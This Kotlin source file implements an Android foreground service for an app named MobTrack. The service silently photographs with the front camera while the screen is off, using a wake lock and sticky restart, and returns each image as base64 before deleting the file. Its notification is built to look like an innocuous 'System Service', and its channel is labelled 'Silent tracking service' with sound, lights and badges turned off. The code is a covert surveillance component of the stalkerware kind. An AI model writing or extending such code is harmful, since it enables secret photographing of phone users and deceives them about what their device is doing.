package expo.modules.backgroundcamera

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import java.io.File

class CameraService : Service(), LifecycleOwner {

    companion object {
        var instance: CameraService? = null
            private set

        private const val TAG = "CameraService"
        private const val CHANNEL_ID = "mobtrack_camera_service"
        private const val NOTIFICATION_ID = 1001
    }

    private val lifecycleRegistry: LifecycleRegistry = LifecycleRegistry(this)
    private var imageCapture: ImageCapture? = null
    private var cameraProvider: ProcessCameraProvider? = null
    private var cameraReady = false
    private var wakeLock: PowerManager.WakeLock? = null

    override val lifecycle: Lifecycle
        get() = lifecycleRegistry

    override fun onCreate() {
        super.onCreate()
        instance = this
        lifecycleRegistry.currentState = Lifecycle.State.INITIALIZED
        Log.d(TAG, "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = buildNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // Acquire a PARTIAL_WAKE_LOCK so the CPU stays awake even with screen off
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MobTrack:CameraService"
        ).also { it.acquire() }

        lifecycleRegistry.currentState = Lifecycle.State.RESUMED
        initCamera()
        Log.d(TAG, "Foreground service started — screen-off capture enabled")
        return START_STICKY
    }

    override fun onDestroy() {
        Log.d(TAG, "Service destroying")
        cameraReady = false
        try { cameraProvider?.unbindAll() } catch (e: Exception) { Log.w(TAG, "Error unbinding camera", e) }
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        wakeLock?.let { if (it.isHeld) it.release() }
        instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "MobTrack Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Silent tracking service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Background process active")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun initCamera() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            try {
                cameraProvider = cameraProviderFuture.get()
                imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .setTargetRotation(android.view.Surface.ROTATION_0)
                    .build()
                cameraProvider?.unbindAll()
                cameraProvider?.bindToLifecycle(this@CameraService, CameraSelector.DEFAULT_FRONT_CAMERA, imageCapture)
                cameraReady = true
                Log.d(TAG, "CameraX initialized — front camera bound")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to initialize CameraX", e)
                cameraReady = false
            }
        }, ContextCompat.getMainExecutor(this))
    }

    fun capturePhoto(callback: (String?, String?) -> Unit) {
        if (!cameraReady || imageCapture == null) {
            Log.w(TAG, "capturePhoto called but camera not ready")
            callback(null, "Camera not ready — still initializing")
            return
        }
        val outputFile = File(cacheDir, "capture_${System.currentTimeMillis()}.jpg")
        val outputOptions = ImageCapture.OutputFileOptions.Builder(outputFile).build()
        Log.d(TAG, "Taking photo...")
        imageCapture!!.takePicture(outputOptions, ContextCompat.getMainExecutor(this),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                    try {
                        val bytes = outputFile.readBytes()
                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        outputFile.delete()
                        callback(base64, null)
                    } catch (e: Exception) {
                        callback(null, "Failed to read photo file: ${e.message}")
                    }
                }
                override fun onError(exc: ImageCaptureException) {
                    callback(null, "Capture failed: ${exc.message}")
                }
            })
    }
}
